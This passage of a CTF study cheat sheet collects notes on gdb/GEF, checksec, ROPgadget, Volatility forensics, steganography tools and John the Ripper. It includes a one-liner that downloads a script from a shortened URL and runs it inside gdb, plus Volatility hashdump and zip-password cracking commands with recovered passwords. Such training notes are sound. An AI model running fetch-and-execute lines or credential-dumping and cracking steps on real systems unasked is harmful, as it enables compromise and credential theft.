(gdb) pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix='-gef.py'); open(g.name, 'wb+').write(u.urlopen('https://tinyurl.com/gef-main').read()); gdb.execute('source %s' % g.name)<br><br>
<img src="images/image36.png"><br><br>
Note: to fetch the latest version of GEF (i.e. from the dev branch), simply replace in the URL to https://gef.blah.cat/dev.  --> This is the one I used, however I modified the script just a bit as the given TinyURL was no longer working, but I believe the documentation is now updated.:<br><br>
<img src="images/image38.png"><br><br>
<img src="images/image40.png"><br><br>
Step 1. Make sure you are root, or at least use sudo.<br><br>
Step 2. Type gdb ./vuln (name of executable):<br><br>
<img src="images/image42.png"><br><br>
Step 3: Launch gef<br>
pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix='-gef.py'); open(g.name, 'wb+').write(u.urlopen('https://tinyurl.com/gef-main').read()); gdb.execute('source %s' % g.name)<br><br>
Step 4: Set a break at “Main” and run the program, within gef:<br><br>
<img src="images/image44.png"><br><br>
Step 5: Now we can use grep inside of gdb for things like the following:<br><br>
<img src="images/image46.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - PLT vs. GOT]</summary>
PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time.<br><br>
GOT stands for Global Offsets Table and is similarly used to resolve addresses. Both PLT and GOT and other relocation information is explained in greater length in this article.<br><br>
Also, Ian Lance Taylor, the author of GOLD has put up an article series on his blog which is totally worth reading (twenty parts!): entry point here "Linkers part 1".<br><br>
<a href="https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got" target="_blank">https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got</a><br>
<a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a><br>
<a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html" target="_blank">https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html</a><br>
<a href="https://www.airs.com/blog/archives/38" target="_blank">https://www.airs.com/blog/archives/38</a><br><br>
Possible Alternative Steps:<br><br>
Step 2. Type gdb -q - ENTER:<br><br>
<img src="images/image47.png"><br><br>
Step 3. Before you can run gef against your executable, you'll need to launch your program inside of gdb first:<br><br>
<img src="images/image49.png"><br><br>
<img src="images/image93.png"><br><br>
Step4: From within GDB, I typed the following:<br><br>
<img src="images/image95.png"><br><br>
<img src="images/image97.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - msf pattern create]</summary>
The msf-pattern_create command (Buffer Overflow/Segmentation Fault)<br>
Generates a unique pattern of characters so that if you want to refer back to where the segmentation fault happened, you can search that due to the text having unique characters.<br><br>
<img src="images/image99.png"><br><br>
</details>

<details markdown>
  <br>
  <summary>[Binary Analysis - gef pattern create]</summary>
The gef-pattern_create command (Buffer Overflow/Segmentation Fault)<br>
Generates a unique pattern of characters so that if you want to refer back to where the segmentation fault happened, you can search that due to the text having unique characters.<br><br>
<a href="https://gef-legacy.readthedocs.io/en/latest/commands/pattern" target="_blank">https://gef-legacy.readthedocs.io/en/latest/commands/pattern</a><br>
<a href="https://hugsy.github.io/gef/commands/pattern/#pattern-create" target="_blank">https://hugsy.github.io/gef/commands/pattern/#pattern-create</a><br><br>
<img src="images/image101.png"><br><br>
<img src="images/image103.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - checksec]</summary>
The checksec Command Helps Identify Security Properties and Vulnerabilities.<br><br>
Must be root, then type: checksec --file=vuln (in this example, vuln is the name of the file we wish to check):<br>
└─# checksec --file=vuln<br><br>
Example1:<br>
<img src="images/image105.png"><br><br>
<img src="images/image107.png"><br><br>
<a href="https://opensource.com/article/21/6/linux-checksec" target="_blank">https://opensource.com/article/21/6/linux-checksec</a><br>
<a href="https://www.systutorials.com/docs/linux/man/7-checksec" target="_blank">https://www.systutorials.com/docs/linux/man/7-checksec</a><br><br>
<a href="https://github.com/slimm609/checksec.sh/blob/main/docs/index.md" target="_blank">https://github.com/slimm609/checksec.sh/blob/main/docs/index.md</a><br><br>
<a href="https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec" target="_blank">https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec</a><br><br>
pwntools has a similar function:<br>
<a href="https://docs.pwntools.com" target="_blank">https://docs.pwntools.com</a><br><br>
#!/usr/bin/env python3<br>
import argparse<br>
import pwn<br>
elf = pwn.ELF("./vuln")<br>
print(hex(elf.symbols["win"]))<br>
<img src="images/image108.png"><br><br>
------<br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - ROPgadget]</summary>
“ROPgadget comes installed with PWN Tools, so if you have those installed, you should just be able to run ROPgadget.  This will list out all of the potential locations in the binary, based off their address, that will do different, particular things.” -John Hammond<br><br>
Type: ROPgadget --binary vuln<br><br>
<img src="images/image109.png"><br><br>
(snipped)<br><br>
Unique gadgets found: 32,148<br><br>
Because there were so many results, we reran ROPgadget and piped the results to a text file for easier searching:<br><br>
<img src="images/image91.png"><br><br>
<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">https://github.com/JonathanSalwan/ROPgadget</a><br>
<a href="http://shell-storm.org/project/ROPgadget" target="_blank">http://shell-storm.org/project/ROPgadget</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - STrace]</summary>
The strace command displays the system calls when a command is executed. You specify the command and its arguments following strace. The system calls and their arguments and returned values are displayed on standard error output.<br><br>
Note: By default, STrace will only spit out 32 characters, but if your output is getting cut off, you can extend that by customizing how many characters you want to push out, see examples below:<br><br>
The following was the output of a partial CTF flag with default STrace settings:<br><br>
<img src="images/image75.jpg"><br><br>
The following was the output of the full CTF flag once I customized my STrace output settings:<br><br>
<img src="images/image77.jpg"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - LTrace]</summary>
Just as strace displays system calls, ltrace displays the functions, arguments, and results of the executed command in the standard error output. ltrace does not reveal from which libraries functions are called.<br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - ObjDump]</summary>
ObjDump is a command-line program for displaying various information about object files on Unix-like operating systems. For instance, it can be used as a disassembler to view an executable in assembly form.<br><br>
<a href="https://en.wikipedia.org/wiki/Objdump" target="_blank">https://en.wikipedia.org/wiki/Objdump</a><br>
<a href="https://www.matteomalvica.com/minutes/binary_analysis" target="_blank">https://www.matteomalvica.com/minutes/binary_analysis</a><br><br>
<img src="images/image79.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Binary Analysis - ObjCopy]</summary>
The GNU objcopy utility copies the contents of an object file to another. objcopy uses the GNU BFD Library to read and write the object files. It can write the destination object file in a format different from that of the source object file.<br><br>
<a href="https://www.oreilly.com/library/view/linux-in-a/0596004826/re308.html" target="_blank">https://www.oreilly.com/library/view/linux-in-a/0596004826/re308.html</a><br>
<a href="https://sourceware.org/binutils/docs/https://www.oreilly.com/library/view/linux-in-a/0596004826/re308.htmlbinutils/objcopy.html" target="_blank">https://sourceware.org/binutils/docs/https://www.oreilly.com/library/view/linux-in-a/0596004826/re308.htmlbinutils/objcopy.html</a><br><br>
<a href="https://en.wikipedia.org/wiki/GNU_Binutils" target="_blank">https://en.wikipedia.org/wiki/GNU_Binutils</a><br><br>
</details>
</details>
<br>



<details markdown>
  <br>
  <summary>[Memory Analysis]</summary>
<details markdown>
  <br>
    <summary>[Memory Analysis - Volatility]</summary>
Volatility is the world's most widely used framework for extracting digital artifacts from volatile memory (RAM) samples. The extraction techniques are performed completely independent of the system being investigated but offer visibility into the runtime state of the system.<br>

<a href="https://www.volatilityfoundation.org/releases-vol3" target="_blank">https://www.volatilityfoundation.org/releases-vol3</a><br>
<a href="https://github.com/volatilityfoundation/volatility3" target="_blank">https://github.com/volatilityfoundation/volatility3</a><br>
<a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference" target="_blank">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a><br>
<a href="https://www.securitynik.com/2022/03/beginning-volatility3-memory-forensics.html" target="_blank">https://www.securitynik.com/2022/03/beginning-volatility3-memory-forensics.html</a><br>
<a href="https://andreafortuna.org/2017/11/15/how-to-retrieve-users-passwords-from-a-windows-memory-dump-using-volatility" target="_blank">https://andreafortuna.org/2017/11/15/how-to-retrieve-users-passwords-from-a-windows-memory-dump-using-volatility</a><br>
<a href="https://www.youtube.com/watch?v=GRmTBugm4js&t=43s" target="_blank">https://www.youtube.com/watch?v=GRmTBugm4js&t=43</a><br>
<a href="https://malwarenailed.blogspot.com/2019/06/suspicious-strings-in-memory.html" target="_blank">https://malwarenailed.blogspot.com/2019/06/suspicious-strings-in-memory.html</a><br>
<a href="https://github.com/volatilityfoundation/volatility3/issues/565" target="_blank">https://github.com/volatilityfoundation/volatility3/issues/565</a><br>
<a href="https://infosecwriteups.com/memory-analysis-for-beginners-with-volatility-coreflood-trojan-part-1-89981433eeb6" target="_blank">https://infosecwriteups.com/memory-analysis-for-beginners-with-volatility-coreflood-trojan-part-1-89981433eeb6</a><br>
<a href="https://evild3ad.com/956/volatility-memory-forensics-basic-usage-for-malware-analysis" target="_blank">https://evild3ad.com/956/volatility-memory-forensics-basic-usage-for-malware-analysis</a><br>
<a href="https://medium.com/@gabriel.pirjolescu/demystifying-windows-malware-hunting-part-2-detecting-execution-with-volatility-1a139b194bfc" target="_blank">https://medium.com/@gabriel.pirjolescu/demystifying-windows-malware-hunting-part-2-detecting-execution-with-volatility-1a139b194bfc</a><br>
<a href="https://resources.infosecinstitute.com/topic/ransomware-analysis-with-volatility" target="_blank">https://resources.infosecinstitute.com/topic/ransomware-analysis-with-volatility</a><br>
<a href="https://andreafortuna.org/2017/07/03/volatility-my-own-cheatsheet-part-2-processes-and-dlls" target="_blank">https://andreafortuna.org/2017/07/03/volatility-my-own-cheatsheet-part-2-processes-and-dlls</a><br><br>

Running Volatility in Kali is pretty straight forward:<br><br>
<img src="images/image81.jpg"><br><br>

--> Note - If you are inside the “volatility3” directory, you would alter these:<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.malfind.Malfind >Malfind.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.pslist.PsList >PSList.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.pstree.PsTree >PStree.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.registry.userassist.UserAssist >UserAssist.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.handles.Handles >Handles.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.psscan.PsScan >PSscan.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.privileges.Privs >Privileges.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.cmdline.CmdLine >CMDline.txt<br><br>

python3 vol.py -f /home/kali/Desktop/memory.raw  windows.bigpools.BigPools >BigPools.txt<br>

python3 vol.py -f /home/kali/Desktop/memory.raw windows.callbacks.Callbacks >Callbacks.txt<br>

python3 vol.py -f /home/kali/Desktop/memory.raw windows.callbacks.Callbacks >Callbacks.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.registry.hivescan.HiveScan >HiveScan.txt<br>

python3 volatility3/vol.py -f MEMORY.DMP windows.registry.hivelist.HiveList >HiveList.txt<br>

python3 vol.py -f '/home/kali/Desktop/memory.raw' windows.hashdump.Hashdump >/home/kali/Desktop/Hashes.txt<br>

python vol.py -f /home/kali/Desktop/memory.raw windows.memmap.Memmap >/home/kali/Desktop/MemMap.txt<br>

python3 vol.py -f '/home/kali/Desktop/m3m0ry_n3v3r_f0rg3tz.raw' windows.filescan.FileScan >/home/kali/Desktop/FileScan.txt<br><br>

CAUTION: THIS FILLS DESKTOP w/ files: python3 volatility3/vol.py -f MEMORY.DMP windows.dumpfiles.DumpFiles >DumpFiles.txt<br><br>

-It needs to be used with, for example, an offset such as the following, and an output folder:<br><br>

(a) python3 vol.py -f '/home/kali/Desktop/mem.raw' -o dump windows.dumpfiles.DumpFiles --virtaddr 0xbd8fb6c02370<br>

(b) python3 vol.py -f '/home/kali/Desktop/RAM.mem' -o /home/kali/Desktop/dump windows.dumpfiles.DumpFiles --physaddr 0x000000007f08fb58<br><br>

[--virtaddr VIRTADDR] [--physaddr PHYSADDR]<br>
optional arguments:<br>
  -h, --help           show this help message and exit<br>
  --pid PID            Process ID to include (all other processes are excluded)<br>
  --virtaddr VIRTADDR  Dump a single _FILE_OBJECT at this virtual address<br>
  --physaddr PHYSADDR  Dump a single _FILE_OBJECT at this physical address<br><br>
</details>
</details>
<br>



<details markdown>
  <br>
  <summary>[File Headers/Magic Bytes/File Types/Carving Files]</summary>
<details markdown>
  <br>
    <summary>[File Headers/Magic Bytes/File Types/Carving Files - Some Resources]</summary>
<a href="https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5" target="_blank">https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5</a><br>
<a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank">https://en.wikipedia.org/wiki/List_of_file_signatures</a><br>
<a href="https://www.garykessler.net/library/file_sigs.html" target="_blank">https://www.garykessler.net/library/file_sigs.html</a><br>
<a href="https://www.netspi.com/blog/technical/web-application-penetration-testing/magic-bytes-identifying-common-file-formats-at-a-glance" target="_blank">https://www.netspi.com/blog/technical/web-application-penetration-testing/magic-bytes-identifying-common-file-formats-at-a-glance</a><br>
<a href="https://anilsoni85.blogspot.com/2014/11/basics-of-png-file-format-with-libpng.html" target="_blank">https://anilsoni85.blogspot.com/2014/11/basics-of-png-file-format-with-libpng.html</a><br>
<a href="https://asecuritysite.com/forensics/png?file=%2Flog%2Fbasn0g01.png" target="_blank">https://asecuritysite.com/forensics/png?file=%2Flog%2Fbasn0g01.png</a><br>
<a href="https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers" target="_blank">https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers</a><br>
<a href="https://www.youtube.com/watch?v=-8f8avZ2V7s&t=614s" target="_blank">https://www.youtube.com/watch?v=-8f8avZ2V7s&t=614s</a><br><br>
</details>
</details>
<br>




<details markdown>
  <br>
  <summary>[Stego]</summary>
<details markdown>
  <br>
    <summary>[Stego - Some Resources]</summary>
<a href="https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography" target="_blank">https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography</a><br>
<a href="https://www.kali.org/tools/steghide" target="_blank">https://www.kali.org/tools/steghide</a><br>
<a href="https://steghide.sourceforge.net" target="_blank">https://steghide.sourceforge.net</a><br>
<a href="https://www.geeksforgeeks.org/how-to-install-steghide-tool-in-linux" target="_blank">https://www.geeksforgeeks.org/how-to-install-steghide-tool-in-linux</a><br>
<a href="https://stegonline.georgeom.net/upload" target="_blank">https://stegonline.georgeom.net/upload</a><br>
<a href="http://magiceye.ecksdee.co.uk" target="_blank">http://magiceye.ecksdee.co.uk</a><br>
<a href="https://manytools.org/hacker-tools/steganography-encode-text-into-image" target="_blank">https://manytools.org/hacker-tools/steganography-encode-text-into-image</a><br>
<a href="https://www.mobilefish.com/services/steganography/steganography.php" target="_blank">https://www.mobilefish.com/services/steganography/steganography.php</a><br>
<a href="http://stylesuxx.github.io/steganography" target="_blank">http://stylesuxx.github.io/steganography</a><br>
<a href="https://futureboy.us/stegano" target="_blank">https://futureboy.us/stegano</a><br>
<a href="https://neatnik.net/steganographr" target="_blank">https://neatnik.net/steganographr</a><br>
<a href="https://wiki.bi0s.in/steganography/zsteg" target="_blank">https://wiki.bi0s.in/steganography/zsteg</a><br>
<a href="https://github.com/zed-0xff/zsteg" target="_blank">https://github.com/zed-0xff/zsteg</a><br>
<a href="https://github.com/ragibson/Steganography#WavSteg" target="_blank">https://github.com/ragibson/Steganography#WavSteg</a><br>
<a href="https://github.com/ragibson/Steganography#lsbsteg" target="_blank">https://github.com/ragibson/Steganography#lsbsteg</a><br>
<a href="https://github.com/ragibson/Steganography#stegdetect" target="_blank">https://github.com/ragibson/Steganography#stegdetect</a><br>
<a href="https://github.com/pavanchhatpar/wav-steg-py" target="_blank">https://github.com/pavanchhatpar/wav-steg-py</a><br>
<a href="https://0xrick.github.io/lists/stego" target="_blank">https://0xrick.github.io/lists/stego</a><br>
<a href="https://www.linuxlinks.com/wavsteg-uses-least-significant-bit-steganography" target="_blank">https://www.linuxlinks.com/wavsteg-uses-least-significant-bit-steganography</a><br>
<a href="https://www.abc.se/~re/Coagula/Coagula.html" target="_blank">https://www.abc.se/~re/Coagula/Coagula.html</a><br>
<a href="https://www.stenge.info/post/steganography" target="_blank">https://www.stenge.info/post/steganography</a><br>
<a href="https://cheatography.com/aleksandrm/cheat-sheets/coagula-cheat-sheet" target="_blank">https://cheatography.com/aleksandrm/cheat-sheets/coagula-cheat-sheet</a><br>
<a href="https://github.com/zardus/ctf-tools/blob/master/stegsolve/install" target="_blank">https://github.com/zardus/ctf-tools/blob/master/stegsolve/install</a><br>
<a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank">http://www.caesum.com/handbook/Stegsolve.jar</a><br>
<a href="https://www.hanynet.com/isteg" target="_blank">https://www.hanynet.com/isteg</a><br>
<a href="https://github.com/rafiibrahim8/iSteg" target="_blank">https://github.com/rafiibrahim8/iSteg</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Stego - iSteg]</summary>
<a href="https://github.com/rafiibrahim8/iSteg" target="_blank">https://github.com/rafiibrahim8/iSteg</a><br><br>
1. Navigated to: <a href="https://github.com/rafiibrahim8/iSteg/releases/tag/v2.1" target="_blank"> https://github.com/rafiibrahim8/iSteg/releases/tag/v2.1.</a><br>
2. Downloaded the file: iSteg-v2.1_GUI.jar.<br>
3. Ran chmod +x on the download file to give it executable permissions.<br>
└─# chmod +x iSteg-v2.1_GUI.jar<br>
4. Launched the program in Java:<br>
└─# java -jar iSteg-v2.1_GUI.jar<br><br>
<img src="images/image211.png"><br><br>
5. Chose the hidden.png file and it opened to the flag, flag{YouFoundMe}:<br><br>
<img src="images/image213.png"><br><br>
</details>

<details markdown>
  <br>
    <summary>[Stego - StegSolve]</summary>
<a href="https://github.com/zardus/ctf-tools/blob/master/stegsolve/install" target="_blank">https://github.com/zardus/ctf-tools/blob/master/stegsolve/install</a><br>
<a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank">http://www.caesum.com/handbook/Stegsolve.jar</a><br>
1. wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar<br>
2. chmod +x stegsolve.jar<br>
3. Run by typing: java –jar stegsolve.jar (make sure you’re in the same directory)<br>
4. Choose “File” --> Open and load your picture:<br><br>
<img src="images/image201.png"><br><br>
</details>
</details>
<br>




<details markdown>
  <br>
  <summary>[Photo Editors/Photo Forensics]</summary>
<details markdown>
  <br>
    <summary>[Photo Editors/Photo Forensics - Some Resources]</summary>
<a href="https://www.photopea.com" target="_blank">https://www.photopea.com</a><br>
<a href="https://29a.ch/photo-forensics/#forensic-magnifier" target="_blank">https://29a.ch/photo-forensics/#forensic-magnifier</a><br><br>
</details>
</details>
<br>




<details markdown>
  <br>
  <summary>[OCR - Google Image Search Offers OCR]</summary>
<details markdown>
  <br>
    <summary>[OCR - Google Image Search Offers OC - Some Resources]</summary>
<a href="https://www.google.com/imghp?hl=en&tab=ri&ogbl" target="_blank">https://www.google.com/imghp?hl=en&tab=ri&ogbl</a><br><br>
</details>
</details>
<br>


<details markdown>
  <br>
  <summary>[Audio]</summary>
<details markdown>
  <br>
    <summary>[Audio - Decoders/Analyzers - Some Resources]</summary>
Note from Dcode regarding T9 vs Multitap Confusion:<br>
Multitap ABC should not be confused with T9 predictive text. For example,'DCODE' is written '3222666333' in Multitap and '32633' in T9.<br>
<a href="https://twitter.com/_johnhammond/status/1244277165316857857?lang=en" target="_blank">https://twitter.com/_johnhammond/status/1244277165316857857?lang=en</a><br><br>
<img src="images/image207.png"><br><br>
<a href="https://www.audacityteam.org/download" target="_blank">https://www.audacityteam.org/download</a><br>
<a href="https://www.sonicvisualiser.org/download.html" target="_blank">https://www.sonicvisualiser.org/download.html</a><br>
<a href="http://dialabc.com/sound/detect/index.html" target="_blank">http://dialabc.com/sound/detect/index.html</a><br>
<a href="http://www.polar-electric.com/DTMF/Index.html" target="_blank">http://www.polar-electric.com/DTMF/Index.html"</a><br>
<a href="https://forums.radioreference.com/threads/twotonedetect-beta.120010" target="_blank">https://forums.radioreference.com/threads/twotonedetect-beta.120010</a><br>
<a href="https://onlinetonegenerator.com/dtmf.html" target="_blank">https://onlinetonegenerator.com/dtmf.html</a><br>
<a href="https://www.venea.net/web/dtmf_generator" target="_blank">https://www.venea.net/web/dtmf_generator</a><br>
<a href="https://github.com/ribt/dtmf-decoder" target="_blank">https://github.com/ribt/dtmf-decoder</a><br>
<a href="https://www.dcode.fr/multitap-abc-cipher" target="_blank">https://www.dcode.fr/multitap-abc-cipher</a><br>
<a href="https://www.dcode.fr/t9-cipheraudi" target="_blank">https://www.dcode.fr/t9-cipheraudi</a><br>
<a href="https://www.windows7download.com/win7-dtmf-tone-decoder/mgbuqfct.html" target="_blank">https://www.windows7download.com/win7-dtmf-tone-decoder/mgbuqfct.html</a><br> 
<a href="http://www.windows7download.com/win7-dtmf-tone-decoder/download-mgbuqfct.html" target="_blank">http://www.windows7download.com/win7-dtmf-tone-decoder/download-mgbuqfct.html</a><br> 
<a href="https://www.windows7download.com/win7-dtmf-tone-decoder/download-mgbuqfct.html" target="_blank">https://www.windows7download.com/win7-dtmf-tone-decoder/download-mgbuqfct.html</a><br> 
<a href="https://dtmf.netlify.app" target="_blank">https://dtmf.netlify.app</a><br>
<a href="https://jpinsoft.net/deepsound/download.aspx" target="_blank">https://jpinsoft.net/deepsound/download.aspx</a><br>
<a href="https://www.youtube.com/watch?v=VZbZa99ocPU&ab_channel=mdthib" target="_blank">https://www.youtube.com/watch?v=VZbZa99ocPU&ab_channel=mdthib</a><br>
<a href="https://www.youtube.com/watch?v=rAGkm4pv44s" target="_blank">https://www.youtube.com/watch?v=rAGkm4pv44s</a><br>
<a href="https://www.aperisolve.com" target="_blank">https://www.aperisolve.com</a><br>
<a href="https://www.aperisolve.com/cheatsheet" target="_blank">https://www.aperisolve.com/cheatsheet</a><br>
<a href="https://www.dcode.fr/spectral-analysis" target="_blank">https://www.dcode.fr/spectral-analysis</a><br>
<a href="https://gqrx.dk" target="_blank">https://gqrx.dk</a><br><br>
</details>

<details markdown>
  <br>
    <summary>[Audio - Extract Morse Code from an audio file]</summary>
<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html" target="_blank">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a><br>
<a href="https://databorder.com/transfer/morse-sound-receiver" target="_blank">https://databorder.com/transfer/morse-sound-receiver</a><br><br>
</details>
</details>
<br>




<details markdown>
  <br>
  <summary>[Large Number/Big Integer/Big Number converter]</summary>
<details markdown>
  <br>
    <summary>[Large Number/Big Integer/Big Number converter - Some Resources]</summary>
<a href="http://www.onedollardata.com/encoder.php" target="_blank">http://www.onedollardata.com/encoder.php</a><br><br>
</details>
</details>
<br>




<details markdown>
  <br>
  <summary>[Reverse Text/Mirror Text/Backward Text/Upsidedown Text]</summary>
<details markdown>
  <br>
    <summary>[Reverse Text/Mirror Text/Backward Text/Upsidedown Text - Some Resources]</summary>
<a href="https://www.flipyourtext.com" target="_blank">https://www.flipyourtext.com</a><br><br>
<img src="images/image199.png"><br><br>
<a href="https://www.upsidedowntext.com" target="_blank">https://www.upsidedowntext.com</a><br><br>
</details>
</details>
<br>











<details markdown>
  <br>
  <summary>[Password Cracking]</summary>
<details markdown>
  <br>
    <summary>[Password Cracking - John the Ripper]</summary>
<ul class="c8 lst-kix_list_37-0"><li class="c0 li-bullet-0"><span class="c9">John the Ripper</span></li></ul><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c17">Example #1:</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c9">1. zip2john flag.zip &gt; hash (For .rar files, see Rar2John below)</span></p><p class="c3"><span class="c9"></span></p><p class="c4"><span class="c9">2. john hash --fork=4 --wordlist=/usr/share/john/rockyou.txt</span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 713.00px; height: 306.00px;"><img alt="" src="images/image84.png" style="width: 713.00px; height: 306.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4"><span class="c9">3. Session completed, you can view the password in yellow font: Soldat*13</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c17">Example #2:</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c9">1. zip2john test.zip &gt; hash</span></p><p class="c3"><span class="c9"></span></p><p class="c4"><span class="c9">2. john hash --wordlist=/usr/share/john/rockyou.txt</span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 714.00px; height: 239.47px;"><img alt="" src="images/image86.png" style="width: 714.00px; height: 239.47px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4"><span class="c17">Example #3:</span></p><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c9">1. zip2john MalDFIR.zip &gt; hash</span></p><p class="c3"><span class="c9"></span></p><p class="c4"><span class="c9">2. john hash --fork=4 --wordlist=/usr/share/john/rockyou.txt</span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 717.53px; height: 293.00px;"><img alt="" src="images/image88.png" style="width: 717.53px; height: 293.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4"><span class="c9">3. Session completed so to view the cracked passwords, type: john hash --show:</span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 425.00px; height: 92.53px;"><img alt="" src="images/image89.png" style="width: 425.00px; height: 92.53px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c2"></span></p><ul class="c8 lst-kix_list_39-0 start"><li class="c0 li-bullet-0"><span class="c2">It doesn&rsquo;t look like the password was cracked this time. &nbsp;To be continued.</span></li></ul><p class="c3"><span class="c2"></span></p><p class="c4"><span class="c17">Example #4:</span></p><p class="c4"><span class="c9">1. Backup.zip is password-protected so I had to crack it. JohnTheRipper with rockyou.txt yielded 741852963:</span></p><p class="c37"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 578.00px; height: 321.00px;"><img alt="" src="images/image72.png" style="width: 578.00px; height: 321.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4"><span class="c9">2. Inside backup.zip are two files:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c37"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 246.00px; height: 111.00px;"><img alt="" src="images/image73.png" style="width: 246.00px; height: 111.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c47"><span class="c9">3. Inside index.php was what appeared to be an MD5 password hash 2cb42f8734ea607eefed3b70af13bbd3:</span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 410.00px;"><img alt="" src="images/image138.png" style="width: 624.00px; height: 410.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4"><span class="c9">4. I put that hash into CrackStation.net and it yielded: qwerty789</span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 313.00px;"><img alt="" src="images/image140.png" style="width: 624.00px; height: 313.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p>


